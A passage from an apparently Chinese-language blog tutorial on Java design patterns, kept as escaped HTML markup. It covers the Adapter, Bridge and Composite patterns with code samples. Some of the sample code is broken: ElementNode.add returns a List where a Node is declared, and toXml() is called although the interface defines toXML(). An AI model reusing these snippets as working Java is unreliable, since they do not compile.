&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RunnableAdapter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">callable&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样一来&lt;code>Thread&lt;/code>接收的对象就是实现了&lt;code>Runnable&lt;/code>接口的&lt;code>RunnableAdapter&lt;/code>，调用它的&lt;code>run&lt;/code>方法，在这个&lt;code>run&lt;/code>内部实际调用了&lt;code>callable&lt;/code>的&lt;code>call&lt;/code>方法&lt;/p>
&lt;p>在java中广泛使用适配器模式，比如我们持有的数据类型是&lt;code>String[]&lt;/code>，但需要&lt;code>List&lt;/code>接口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">exist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;and&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Alice&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Set&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">set&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">exist&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的&lt;code>Arrays.asList&lt;/code>就是一个转换器，将数组转换为List&lt;/p>
&lt;p>例子2：我们持有一个&lt;code>InputStream&lt;/code>，希望调用&lt;code>readText(Reader)&lt;/code>方法，但它的参数类型是&lt;code>Reader&lt;/code>不是&lt;code>InputStream&lt;/code>，我们可以使用适配器把&lt;code>InputStream&lt;/code>变为&lt;code>Reader&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">readText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的&lt;code>InputStreamReader&lt;/code>就是java标准库的Adapter，负责把一个&lt;code>InputStream&lt;/code>适配为&lt;code>Reader&lt;/code>，类似的还有&lt;code>OutputStreamWriter&lt;/code>&lt;/p>
&lt;h3 id="桥接bridge">桥接Bridge&lt;/h3>
&lt;p>举例：某汽车厂商生产3种品牌的汽车：Big, Tiny, Boss，每个品牌各有纯油、纯电、混动，如果用传统的继承来表示各个车型，需要3个抽象类+9个实现子类&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220902231807074.png" alt="image-20220902231807074">&lt;/p>
&lt;p>如果要新增一个品牌或新的动力类型，那么子类会爆炸增长，桥接模式就是为了解决继承有可能带来的子类爆炸问题&lt;/p>
&lt;p>桥接模式中，首先将&lt;code>Car&lt;/code>按品牌进行子类化，但是每个品牌的动力类型不再使用子类扩充，而是通过一个抽象的“修正”类，以组合的形式引入&lt;/p>
&lt;p>首先定义抽象类&lt;code>Car&lt;/code>，引入&lt;code>Engine&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Car&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Engine&lt;/span> &lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Car&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Engine&lt;/span> &lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">drive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Engine&lt;/code>的定义如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Engine&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>紧接着，在一个“修正”的抽象类&lt;code>RefinedCar&lt;/code>中定义一些额外操作&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RefinedCar&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Car&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">RefinedCar&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Engine&lt;/span> &lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">drive&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Drvie &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getBrand&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; car...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getBrand&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样一来，最终的不同品牌的车型继承自&lt;code>RefinedCar&lt;/code>，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BossCar&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RefinedCar&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BossCar&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Engine&lt;/span> &lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">engine&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getBrand&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Boss&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而动力类型继承自&lt;code>Engine&lt;/code>，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HybridEngine&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Engine&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Start Hybrid Engine...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而最终的“车”，可以组合得到&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">RefinedCar&lt;/span> &lt;span style="color:#111">car&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BossCar&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HybridEngine&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">car&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">drive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>显而易见，桥接模式的好处在于能更自由的对想要的子类根据不同的需求进行一个排列组合&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220902233406811.png" alt="image-20220902233406811">&lt;/p>
&lt;p>廖大的这个图还是很清楚的，我们的两个需求分别是车型和动力类型，各有各的需求，通过桥接的模式组装在一起，而不是一味的继承继承继承、&lt;/p>
&lt;h3 id="组合composite">组合Composite&lt;/h3>
&lt;p>Composite模式使得叶子对象和容器对象具有一致性，从而形成统一的树形结构，并用一致的方式去处理它们&lt;/p>
&lt;p>举例：XML和HTML就使用了树形结构，根节点下有嵌套的子节点&lt;/p>
&lt;p>要以树形结构表示XML，我们可以先抽象出节点类型&lt;code>Node&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Node&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 可以添加一个节点为子节点
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取子节点
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 输出XML
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toXML&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于&lt;code>&amp;lt;abc&amp;gt;&lt;/code>这样的ElementNode，可以作为容器包含多个子节点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ElementNode&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ElementNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toXML&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">start&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;gt;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">end&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;gt;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StringJoiner&lt;/span> &lt;span style="color:#111">sj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringJoiner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">start&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toXml&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于普通文本，我们视作TextNode，没有子节点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TextNode&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">TextNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
